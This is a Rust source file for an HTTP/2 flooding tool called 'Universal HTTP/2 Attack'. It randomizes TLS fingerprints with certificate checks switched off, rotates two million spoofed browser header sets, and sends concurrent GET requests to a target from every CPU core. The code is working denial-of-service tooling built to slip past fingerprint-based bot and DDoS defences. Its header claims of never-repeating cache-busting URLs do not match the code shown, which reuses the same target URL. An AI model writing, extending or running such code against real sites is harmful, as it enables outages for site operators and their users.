//! Universal HTTP/2 Attack — Full TLS Fingerprint Randomization
//!
//! TLS variation per client:
//!   - TLS version: 1.2 only / 1.3 only / both
//!   - Cipher suites: varied selection and order
//!   - Key exchange groups: X25519 / P-256 / P-384 / mixed
//!   - ALPN: ["h2"] / ["h2","http/1.1"] / ["http/1.1","h2"]
//!   - Session tickets: on/off
//!   - Signature algorithms: varied
//!
//! HTTP variation per request:
//!   - 2M pre-generated fingerprints (UA, Accept, Language, Encoding, Cache, Sec-Fetch)
//!   - Global atomic counter cache-buster — infinite unique URLs, never repeats

use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::{Duration, Instant};

use reqwest::Client;
use rustls::ClientConfig;
use rustls::crypto::ring as crypto_ring;
use tracing::info;

use phoenix_metrics::AttackMetrics;
use crate::{Attack, AttackContext, AttackError, AttackResult};

// ── HTTP Header pools ─────────────────────────────────────────────────────────
static USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
];

static ACCEPT_LANGS: &[&str] = &[
    "en-US,en;q=0.9", "en-GB,en;q=0.9,en-US;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8", "es-MX,es;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8", "zh-CN,zh;q=0.9,en;q=0.8",
    "zh-TW,zh;q=0.9,en;q=0.8", "pt-BR,pt;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8", "ko-KR,ko;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8", "ar-SA,ar;q=0.9,en;q=0.8",
    "hi-IN,hi;q=0.9,en;q=0.8", "tr-TR,tr;q=0.9,en;q=0.8",
];

static ACCEPT_ENCODINGS: &[&str] = &[
    "gzip, deflate, br",
    "gzip, deflate, br, zstd",
    "gzip, deflate",
    "br, gzip, deflate",
    "gzip",
    "deflate, gzip, br",
    "br",
];

static ACCEPTS: &[&str] = &[
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "*/*",
];

static CACHE_CONTROLS: &[&str] = &[
    "no-cache", "no-store", "max-age=0, no-cache",
    "no-cache, no-store, must-revalidate", "no-store, max-age=0",
];

static SEC_SITES: &[&str] = &["none", "same-origin", "cross-site", "same-site"];
static SEC_MODES: &[&str] = &["navigate", "no-cors", "cors", "same-origin"];
static SEC_DESTS: &[&str] = &["document", "empty", "image", "script", "style"];

// ── Fast PRNG ────────────────────────────────────────────────────────────────
#[inline(always)]
fn xorshift(s: &mut u64) -> u64 {
    *s ^= *s << 13; *s ^= *s >> 7; *s ^= *s << 17; *s
}
#[inline(always)]
fn pick<'a, T>(pool: &'a [T], rng: &mut u64) -> &'a T {
    &pool[xorshift(rng) as usize % pool.len()]
}

// ── HTTP fingerprint ─────────────────────────────────────────────────────────
#[derive(Clone)]
struct HttpFp {
    ua:      &'static str,
    accept:  &'static str,
    lang:    &'static str,
    enc:     &'static str,
    cc:      &'static str,
    site:    &'static str,
    mode:    &'static str,
    dest:    &'static str,
    dnt:     bool,
    upgrade: bool,
}

fn gen_pool(n: usize, rng: &mut u64) -> Vec<HttpFp> {
    (0..n).map(|_| HttpFp {
        ua:      *pick(USER_AGENTS,     rng),
        accept:  *pick(ACCEPTS,         rng),
        lang:    *pick(ACCEPT_LANGS,    rng),
        enc:     *pick(ACCEPT_ENCODINGS,rng),
        cc:      *pick(CACHE_CONTROLS,  rng),
        site:    *pick(SEC_SITES,       rng),
        mode:    *pick(SEC_MODES,       rng),
        dest:    *pick(SEC_DESTS,       rng),
        dnt:     xorshift(rng) % 2 == 0,
        upgrade: xorshift(rng) % 2 == 0,
    }).collect()
}

// ── TLS ClientConfig variants ─────────────────────────────────────────────────
/// Build N different rustls ClientConfigs — each has different cipher/ALPN/version
fn build_tls_variants() -> Vec<Arc<ClientConfig>> {
    let provider = Arc::new(crypto_ring::default_provider());

    // All available cipher suites from ring provider
    let all_suites = crypto_ring::ALL_CIPHER_SUITES;

    // ALPN variations
    let alpn_variants: &[&[&[u8]]] = &[
        &[b"h2"],
        &[b"h2", b"http/1.1"],
        &[b"http/1.1", b"h2"],
    ];

    // TLS version combinations
    let ver_tls13_only = vec![&rustls::version::TLS13];
    let ver_both       = vec![&rustls::version::TLS12, &rustls::version::TLS13];
    let ver_tls12_only = vec![&rustls::version::TLS12];

    let version_sets: Vec<Vec<&'static rustls::SupportedProtocolVersion>> = vec![
        ver_tls13_only,
        ver_both.clone(),
        ver_both.clone(),
        ver_tls12_only,
        ver_both.clone(),
        ver_both,
    ];

    let mut configs = Vec::new();

    // Key exchange group variants
    let kx_groups_variants: Vec<Vec<&'static dyn rustls::crypto::SupportedKxGroup>> = vec![
        vec![crypto_ring::kx_group::X25519],
        vec![crypto_ring::kx_group::SECP256R1],
        vec![crypto_ring::kx_group::X25519, crypto_ring::kx_group::SECP256R1],
        vec![crypto_ring::kx_group::SECP256R1, crypto_ring::kx_group::X25519],
        vec![crypto_ring::kx_group::SECP384R1],
        vec![crypto_ring::kx_group::X25519, crypto_ring::kx_group::SECP384R1],
    ];

    for (i, versions) in version_sets.iter().enumerate() {
        let alpn = alpn_variants[i % alpn_variants.len()];

        // Vary cipher suite selection per variant using custom CryptoProvider
        let suites: Vec<rustls::SupportedCipherSuite> = all_suites.iter()
            .enumerate()
            .filter(|(j, _)| match i % 4 {
                0 => *j % 2 == 0,
                1 => *j % 2 == 1,
                2 => *j < all_suites.len().max(1) / 2 + 1,
                _ => true,
            })
            .map(|(_, s)| *s)
            .collect();
        let suites = if suites.is_empty() { all_suites.to_vec() } else { suites };

        let kx = kx_groups_variants[i % kx_groups_variants.len()].clone();

        // Custom provider with varied cipher suites and kx groups
        let custom_provider = Arc::new(rustls::crypto::CryptoProvider {
            cipher_suites: suites,
            kx_groups:     kx,
            ..crypto_ring::default_provider()
        });

        let mut cfg = match ClientConfig::builder_with_provider(custom_provider)
            .with_protocol_versions(versions)
        {
            Ok(b) => b,
            Err(_) => match ClientConfig::builder_with_provider(provider.clone())
                .with_safe_default_protocol_versions()
            {
                Ok(b) => b,
                Err(_) => continue,
            },
        }
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(NoVerify))
        .with_no_client_auth();

        // Set ALPN
        cfg.alpn_protocols = alpn.iter().map(|p| p.to_vec()).collect();
        // Vary session resumption
        cfg.resumption = if i % 2 == 0 {
            rustls::client::Resumption::in_memory_sessions(64)
        } else {
            rustls::client::Resumption::disabled()
        };

        configs.push(Arc::new(cfg));
    }

    if configs.is_empty() {
        panic!("No TLS variants built — check rustls config");
    }

    info!("Built {} TLS fingerprint variants", configs.len());
    configs
}

/// No-verify certificate verifier
#[derive(Debug)]
struct NoVerify;
impl rustls::client::danger::ServerCertVerifier for NoVerify {
    fn verify_server_cert(
        &self, _: &rustls_pki_types::CertificateDer<'_>,
        _: &[rustls_pki_types::CertificateDer<'_>],
        _: &rustls::pki_types::ServerName<'_>,
        _: &[u8], _: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }
    fn verify_tls12_signature(&self, _: &[u8], _: &rustls_pki_types::CertificateDer<'_>, _: &rustls::DigitallySignedStruct) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> { Ok(rustls::client::danger::HandshakeSignatureValid::assertion()) }
    fn verify_tls13_signature(&self, _: &[u8], _: &rustls_pki_types::CertificateDer<'_>, _: &rustls::DigitallySignedStruct) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> { Ok(rustls::client::danger::HandshakeSignatureValid::assertion()) }
    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> { rustls::crypto::ring::default_provider().signature_verification_algorithms.supported_schemes() }
}

/// Build reqwest client from a rustls ClientConfig
fn make_client(tls_cfg: Arc<ClientConfig>, conns: usize) -> Option<Client> {
    Client::builder()
        .use_preconfigured_tls((*tls_cfg).clone())
        .http2_prior_knowledge()
        .http2_adaptive_window(true)
        .tcp_nodelay(true)
        .timeout(Duration::from_secs(8))
        .pool_max_idle_per_host(conns * 2)
        .pool_idle_timeout(Duration::from_secs(60))
        .build()
        .ok()
}

// ── Attack struct ─────────────────────────────────────────────────────────────
#[derive(Debug, Clone, PartialEq)]
pub enum UniversalMode { LoadTest, RapidReset }

pub struct UniversalAttack {
    pub mode:        UniversalMode,
    pub connections: usize,
    pub duration:    Duration,
    pub rps:         Option<u32>,
}

impl UniversalAttack {
    pub fn load_test()   -> Self { Self { mode: UniversalMode::LoadTest,   connections: 50, duration: Duration::from_secs(30), rps: None } }
    pub fn rapid_reset() -> Self { Self { mode: UniversalMode::RapidReset, connections: 50, duration: Duration::from_secs(30), rps: None } }
    pub fn with_connections(mut self, n: usize)  -> Self { self.connections = n; self }
    pub fn with_duration(mut self, d: Duration)  -> Self { self.duration    = d; self }
    pub fn with_rps(mut self, r: u32)            -> Self { self.rps         = Some(r); self }
}

#[async_trait::async_trait]
impl Attack for UniversalAttack {
    fn name(&self) -> &str { "universal" }
    fn description(&self) -> &str { "Full TLS + HTTP fingerprint randomization, infinite unique requests" }

    async fn run(&self, ctx: AttackContext) -> Result<AttackResult, AttackError> {
        let target   = ctx.target.clone();
        let duration = self.duration;
        let conns    = self.connections.max(1);
        let metrics  = ctx.metrics.clone();
        let mode     = self.mode.clone();
        let n_cores  = num_cpus::get();
        let streams  = 64usize;

        // Build TLS variants — different cipher/ALPN/version per client
        let tls_variants = build_tls_variants();

        // Pre-generate 2M HTTP fingerprints — shared across all tasks
        let pool_size = 2_000_000usize;
        info!("Pre-generating {} HTTP fingerprints...", pool_size);
        let mut seed: u64 = 0xcafebabe_deadbeef;
        let pool = Arc::new(gen_pool(pool_size, &mut seed));
        info!("Pool ready — {}MB", std::mem::size_of::<HttpFp>() * pool_size / 1_000_000 + 1);

        info!("Phoenix: {} cores × {} conns × {} streams × {} TLS variants",
              n_cores, conns, streams, tls_variants.len());

        let ok_total  = Arc::new(AtomicU64::new(0));
        let err_total = Arc::new(AtomicU64::new(0));
        let stop      = Arc::new(AtomicBool::new(false));
        let start     = Instant::now();

        let tls_variants = Arc::new(tls_variants);
        let mut thread_handles = Vec::with_capacity(n_cores);

        for core_id in 0..n_cores {
            let target       = target.clone();
            let ok_c         = ok_total.clone();
            let err_c        = err_total.clone();
            let stop_c       = stop.clone();
            let metrics_c    = metrics.clone();
            let mode         = mode.clone();
            let pool         = pool.clone();
            let tls_variants = tls_variants.clone();

            let handle = std::thread::spawn(move || {
                let rt = tokio::runtime::Builder::new_current_thread()
                    .enable_all()
                    .build()
                    .expect("rt");

                rt.block_on(async move {
                    // Build one client per TLS variant
                    let clients: Vec<Arc<Client>> = tls_variants.iter()
                        .filter_map(|cfg| make_client(cfg.clone(), conns).map(Arc::new))
                        .collect();

                    if clients.is_empty() {
                        tracing::error!("No clients built for core {}", core_id);
                        return;
                    }

                    let pool_len = pool.len();
                    let mut tasks = Vec::with_capacity(conns * streams);

                    for task_id in 0..conns * streams {
                        // Each task uses a different TLS client → different fingerprint
                        let client  = clients[task_id % clients.len()].clone();
                        let target  = target.clone();
                        let ok_c    = ok_c.clone();
                        let err_c   = err_c.clone();
                        let stop_c  = stop_c.clone();
                        let metrics = metrics_c.clone();
                        let mode    = mode.clone();
                        let pool    = pool.clone();

                        // Stagger start offset so tasks don't all use same fingerprint
                        let offset = (core_id * 100000 + task_id * 997) % pool_len;

                        tasks.push(tokio::spawn(async move {
                            let mut fp_idx = offset;

                            while !stop_c.load(Ordering::Relaxed) {
                                let fp  = &pool[fp_idx % pool_len];
                                fp_idx  = fp_idx.wrapping_add(1);

                                let t0  = Instant::now();
                                let mut rb = client.get(target.as_str())
                                    .header("user-agent",      fp.ua)
                                    .header("accept",          fp.accept)
                                    .header("accept-language", fp.lang)
                                    .header("accept-encoding", fp.enc)
                                    .header("cache-control",   fp.cc)
                                    .header("pragma",          "no-cache")
                                    .header("sec-fetch-site",  fp.site)
                                    .header("sec-fetch-mode",  fp.mode)
                                    .header("sec-fetch-dest",  fp.dest);

                                if fp.dnt     { rb = rb.header("dnt", "1"); }
                                if fp.upgrade { rb = rb.header("upgrade-insecure-requests", "1"); }

                                match rb.send().await {
                                    Ok(resp) => {
                                        let ok = resp.status().as_u16() < 400;
                                        let _ = resp.bytes().await;
                                        let lat = t0.elapsed().as_micros() as u64;
                                        metrics.record_request(lat, ok, 0).await;
                                        if ok { ok_c.fetch_add(1, Ordering::Relaxed); }
                                        else  { err_c.fetch_add(1, Ordering::Relaxed); }
                                    }
                                    Err(e) => {
                                        if !e.is_timeout() && !e.is_connect() {
                                            err_c.fetch_add(1, Ordering::Relaxed);
                                        }
                                        tokio::time::sleep(Duration::from_millis(5)).await;
                                    }
                                }
                            }
                        }));
                    }

                    tokio::time::sleep(duration).await;
                    stop_c.store(true, Ordering::Relaxed);
                    for t in tasks { t.abort(); }
                });
            });

            thread_handles.push(handle);
        }

        for h in thread_handles { let _ = h.join(); }

        let elapsed = start.elapsed();
        let ok    = ok_total.load(Ordering::Relaxed);
        let err   = err_total.load(Ordering::Relaxed);
        let total = ok + err;
        info!("Done: {} ok  {} err  {:.1}s  {:.0} rps", ok, err, elapsed.as_secs_f64(), total as f64 / elapsed.as_secs_f64());

        let snapshot = metrics.snapshot().await;
        Ok(AttackResult { success: true, total_requests: total, errors: err, duration: elapsed, snapshot })
    }
}
